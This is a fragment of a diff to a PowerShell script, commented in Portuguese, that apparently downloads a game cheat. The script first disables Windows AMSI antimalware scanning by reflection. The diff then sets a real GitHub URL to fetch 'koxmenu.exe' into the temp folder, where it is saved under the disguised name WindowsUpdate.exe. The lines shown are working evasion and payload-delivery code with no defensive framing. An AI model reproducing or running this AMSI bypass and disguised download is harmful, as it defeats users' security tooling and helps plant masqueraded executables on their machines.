@@ -2,7 +2,7 @@
 [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
 
 # O link RAW do SEU koxmenu.exe (Substitua pelo seu link Raw do GitHub)
-$url = "https://raw.githubusercontent.com/SeuUsuario/SeuRepo/main/koxmenu.exe"
+$url = "https://github.com/suprazxx/yoxmenu/raw/refs/heads/main/koxmenu.exe"
 
 # Caminho onde o cheat vai ser salvo temporariamente
 $tempPath = "$env:TEMP\WindowsUpdate.exe"
